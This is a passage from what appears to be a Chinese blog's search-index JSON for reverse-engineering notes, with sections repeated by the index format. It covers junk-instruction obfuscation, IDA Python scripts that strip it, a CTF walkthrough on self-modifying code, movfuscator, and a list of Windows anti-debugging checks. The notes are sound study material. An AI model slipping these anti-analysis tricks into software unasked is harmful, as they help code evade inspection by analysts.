2.这类花指令一般不属于CPU可以识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序正常运行。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#不可执行花指令"},{"categories":["Reverse","notes"],"content":"\r0x3 一点点收集\r1.简单的花指令0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。 jz，jnz意味着无论如何都将跳转到labell这个无效数据 2.简单的jmpPD能被骗过去，但是因为IDA采用的是递归扫描算法所以能够正常识别 #include\u003cstdio.h\u003e int main() { __asm{ jmp label1; __emit 0xe8; label1: } printf(\"Hello World!\"); return 0; } ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x3-一点点收集"},{"categories":["Reverse","notes"],"content":"\r0x3 一点点收集\r1.简单的花指令0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。 jz，jnz意味着无论如何都将跳转到labell这个无效数据 2.简单的jmpPD能被骗过去，但是因为IDA采用的是递归扫描算法所以能够正常识别 #include int main() { __asm{ jmp label1; __emit 0xe8; label1: } printf(\"Hello World!\"); return 0; } ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#1简单的花指令"},{"categories":["Reverse","notes"],"content":"\r0x3 一点点收集\r1.简单的花指令0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。 jz，jnz意味着无论如何都将跳转到labell这个无效数据 2.简单的jmpPD能被骗过去，但是因为IDA采用的是递归扫描算法所以能够正常识别 #include int main() { __asm{ jmp label1; __emit 0xe8; label1: } printf(\"Hello World!\"); return 0; } ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#2简单的jmp"},{"categories":["Reverse","notes"],"content":"\r3.多级跳转 #include\u003cstdio.h\u003e int main() { __asm{ start://花指令开始 jmp label1; __emit 0xe8; label1: jmp label2; __emit 0xe8; label2: jmp label3; __emit 0xe8; label3: } printf(\"Hello World!\"); return 0; } ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:5","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#3多级跳转"},{"categories":["Reverse","notes"],"content":"\r4.call\u0026ret构造花指令 __asm{ call label1 _emit junkcode label1: add dword ptr ss:[esp],8//具体增加多少根据调试来 ret _emit junkcode } call指令：将下一条指令地址压入栈，再跳转执行 ret指令：将保存的地址取出，跳转执行 ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:6","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#4callret构造花指令"},{"categories":["Reverse","notes"],"content":"\r0x4 如何处理\r1.手动清除找到所有的花指令，重新设置数据和代码地址。或者将花指令设置为nop（0x90） 在0x401051设置为数据类型（快捷键D）,在0x401052设置为代码类型（快捷键C） 这里用一个ida python脚本添加ALT+N快捷键来将指令的第一个字节设置为NOP from idaapi import * from idc import * def nopIt(): start = get_screen_ea() patch_byte(start,0x90) refresh_idaview_anyway() add_hotkey(\"alt-N\",nopIt) 2.自动清楚花指令上面有3个类别ida无法正常识别 互补条件跳转（比较好处理） 永真条件跳转 （各种永真条件比较难匹配） call\u0026ret跳转（比较难处理） 所以就只对第一种jnx和jx的花指令进行自动化处理 所有的跳转指令，互补跳转指令只有最后一个bit位不同 70 \u003c–\u003e JO(O标志位为1跳转) 71 \u003c–\u003e JNO 72 \u003c–\u003e JB/JNAE/JC 73 \u003c–\u003e JNB/JAE/JNC 74 \u003c–\u003e JZ/JE 75 \u003c–\u003e JNZ/JNE 76 \u003c–\u003e JBE/JNA 77 \u003c–\u003e JNBE/JA 78 \u003c–\u003e JS 79 \u003c–\u003e JNS 7A \u003c–\u003e JP/JPE 7B \u003c–\u003e JNP/JPO 7C \u003c–\u003e JL/JNGE 7D \u003c–\u003e JNL/JGE 7E \u003c–\u003e JLE/JNG 7F \u003c–\u003e JNLE/JG 第一条指令跳转距离=第二条跳转距离+2。简单一点可以是\\x03和\\x01 抄的代码 from ida_bytes import get_bytes,patch_bytes start= 0x401000#start addr end = 0x422000 buf = get_bytes(start,end-start) def patch_at(p,ln): global buf buf = buf[:p]+b\"\\x90\"*ln+buf[p+ln:] fake_jcc=[] for opcode in range(0x70,0x7f,2): pattern = chr(opcode)+\"\\x03\"+chr(opcode|1)+\"\\x01\" fake_jcc.append(pattern.encode()) pattern = chr(opcode|1)+\"\\x03\"+chr(opcode)+\"\\x01\" fake_jcc.append(pattern.encode()) print(fake_jcc) for pattern in fake_jcc: p = buf.find(pattern) while p != -1: patch_at(p,5) p = buf.find(pattern,p+1) patch_bytes(start,buf) print(\"Done\") ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x4-如何处理"},{"categories":["Reverse","notes"],"content":"\r0x4 如何处理\r1.手动清除找到所有的花指令，重新设置数据和代码地址。或者将花指令设置为nop（0x90） 在0x401051设置为数据类型（快捷键D）,在0x401052设置为代码类型（快捷键C） 这里用一个ida python脚本添加ALT+N快捷键来将指令的第一个字节设置为NOP from idaapi import * from idc import * def nopIt(): start = get_screen_ea() patch_byte(start,0x90) refresh_idaview_anyway() add_hotkey(\"alt-N\",nopIt) 2.自动清楚花指令上面有3个类别ida无法正常识别 互补条件跳转（比较好处理） 永真条件跳转 （各种永真条件比较难匹配） call\u0026ret跳转（比较难处理） 所以就只对第一种jnx和jx的花指令进行自动化处理 所有的跳转指令，互补跳转指令只有最后一个bit位不同 70 \u003c–\u003e JO(O标志位为1跳转) 71 \u003c–\u003e JNO 72 \u003c–\u003e JB/JNAE/JC 73 \u003c–\u003e JNB/JAE/JNC 74 \u003c–\u003e JZ/JE 75 \u003c–\u003e JNZ/JNE 76 \u003c–\u003e JBE/JNA 77 \u003c–\u003e JNBE/JA 78 \u003c–\u003e JS 79 \u003c–\u003e JNS 7A \u003c–\u003e JP/JPE 7B \u003c–\u003e JNP/JPO 7C \u003c–\u003e JL/JNGE 7D \u003c–\u003e JNL/JGE 7E \u003c–\u003e JLE/JNG 7F \u003c–\u003e JNLE/JG 第一条指令跳转距离=第二条跳转距离+2。简单一点可以是\\x03和\\x01 抄的代码 from ida_bytes import get_bytes,patch_bytes start= 0x401000#start addr end = 0x422000 buf = get_bytes(start,end-start) def patch_at(p,ln): global buf buf = buf[:p]+b\"\\x90\"*ln+buf[p+ln:] fake_jcc=[] for opcode in range(0x70,0x7f,2): pattern = chr(opcode)+\"\\x03\"+chr(opcode|1)+\"\\x01\" fake_jcc.append(pattern.encode()) pattern = chr(opcode|1)+\"\\x03\"+chr(opcode)+\"\\x01\" fake_jcc.append(pattern.encode()) print(fake_jcc) for pattern in fake_jcc: p = buf.find(pattern) while p != -1: patch_at(p,5) p = buf.find(pattern,p+1) patch_bytes(start,buf) print(\"Done\") ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#1手动清除"},{"categories":["Reverse","notes"],"content":"\r0x4 如何处理\r1.手动清除找到所有的花指令，重新设置数据和代码地址。或者将花指令设置为nop（0x90） 在0x401051设置为数据类型（快捷键D）,在0x401052设置为代码类型（快捷键C） 这里用一个ida python脚本添加ALT+N快捷键来将指令的第一个字节设置为NOP from idaapi import * from idc import * def nopIt(): start = get_screen_ea() patch_byte(start,0x90) refresh_idaview_anyway() add_hotkey(\"alt-N\",nopIt) 2.自动清楚花指令上面有3个类别ida无法正常识别 互补条件跳转（比较好处理） 永真条件跳转 （各种永真条件比较难匹配） call\u0026ret跳转（比较难处理） 所以就只对第一种jnx和jx的花指令进行自动化处理 所有的跳转指令，互补跳转指令只有最后一个bit位不同 70 \u003c–\u003e JO(O标志位为1跳转) 71 \u003c–\u003e JNO 72 \u003c–\u003e JB/JNAE/JC 73 \u003c–\u003e JNB/JAE/JNC 74 \u003c–\u003e JZ/JE 75 \u003c–\u003e JNZ/JNE 76 \u003c–\u003e JBE/JNA 77 \u003c–\u003e JNBE/JA 78 \u003c–\u003e JS 79 \u003c–\u003e JNS 7A \u003c–\u003e JP/JPE 7B \u003c–\u003e JNP/JPO 7C \u003c–\u003e JL/JNGE 7D \u003c–\u003e JNL/JGE 7E \u003c–\u003e JLE/JNG 7F \u003c–\u003e JNLE/JG 第一条指令跳转距离=第二条跳转距离+2。简单一点可以是\\x03和\\x01 抄的代码 from ida_bytes import get_bytes,patch_bytes start= 0x401000#start addr end = 0x422000 buf = get_bytes(start,end-start) def patch_at(p,ln): global buf buf = buf[:p]+b\"\\x90\"*ln+buf[p+ln:] fake_jcc=[] for opcode in range(0x70,0x7f,2): pattern = chr(opcode)+\"\\x03\"+chr(opcode|1)+\"\\x01\" fake_jcc.append(pattern.encode()) pattern = chr(opcode|1)+\"\\x03\"+chr(opcode)+\"\\x01\" fake_jcc.append(pattern.encode()) print(fake_jcc) for pattern in fake_jcc: p = buf.find(pattern) while p != -1: patch_at(p,5) p = buf.find(pattern,p+1) patch_bytes(start,buf) print(\"Done\") ","date":"2023-11-17","objectID":"/reverse-antidbg/:2:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#2自动清楚花指令"},{"categories":["Reverse","notes"],"content":"\r三.SMC自解码SMC（Self-Modifying Code）（自解码），可以在一段代码执行前对它进行修改。 常常利用这个特性，把代码以加密的形式保存在可自行文件中，然后在程序执行的时候进行动态解析。这样我们在采用静态分析时，看到的都是加密的内容，从而阻断了静态调试的可能性。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:3:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#三smc自解码"},{"categories":["Reverse","notes"],"content":"\rsms题目静态分析拿到题目，找到main函数，进行反编译 进行代码审计，然而，能传参的肯定是函数，分析byte_403020这个函数，双击跟进 然而得到的确实一堆数据，而不是函数。这就是典型的对某段代码进行了加密处理，上面的异或操作既是加密操作也是也解密操作，这样我们静态分析就进行不下去了。这样的情况就是SMC自解码问题。 解决此类问题，就要进行动态分析 ","date":"2023-11-17","objectID":"/reverse-antidbg/:3:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#sms题目静态分析"},{"categories":["Reverse","notes"],"content":"\rsms题目动态分析使用OllyDbg找到主函数，开始单步执行 大部分的逻辑就是下面注释的地方，我们需要关注的重点在于找到处理输入函数的地方，看看在解密后的那个函数是怎样对输入内容进行比较或者变换的 当运行到这个地步的时候，我们就发现函数快运行到结束了 在函数结束之前，调用了EAX，其实就是解密后的函数。这个地方就是我们静态分析想要分析的地方。因此，在这里我们就可以跟进去。因为现在那个数组经过解密后已经是一个函数了。 进入之后我们就发现了比较的指令。看看比较的内容，翻译一下就是BUPT{ 总的来说，就是需要通过程序调试，进行单步执行，当程序执行到解码的步骤时，就会对主程序进行解码运行，静态状态是加密的。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:3:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#sms题目动态分析"},{"categories":["Reverse","notes"],"content":"\r四.MOV混淆 MOV这种混淆是怎样产生的呢？剑桥大学的Stephen Dolan证明了x86的mov指令可以完成几乎所有功能了（可能还需要jmp），其他指令都是“多余的”。受此启发，有个大牛做了一个虚拟机加密编译器。它是一个修改版的LCC编译器，输入是C语言代码，输出的obj里面直接包含了虚拟机加密后的代码。如它的名字，函数的所有代码只有mov指令，没有其他任何指令。这个加密编译器在网上是开源的项目。 https://github.com/xoreaxeaxeax/movfuscator 这种题目的特征就是：汇编代码的汇编指令几乎全部就是MOV 这种情况，我们几乎无法直接审计汇编代码 这道题没用啥特殊技巧，通过不断观察后发现，r2后的字符拼接起来或许就是flag字符串 我们进行全局搜索R2,得到flag 总结一下： 1.注意字符串的全局搜索 2.MOV并不混淆函数逻辑 3.大多数汇编代码可以猜测 ","date":"2023-11-17","objectID":"/reverse-antidbg/:4:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#四mov混淆"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#附按调试函数"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x1-isdebuggerpresent函数"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x2-nequeryinformationprocess函数"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x3-checkremotedebuggerpresent函数"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x4-findwindowaenumwindows"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x5-outputdebug-string"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x6-注册表检测"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x7-begindebugged标志检测"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 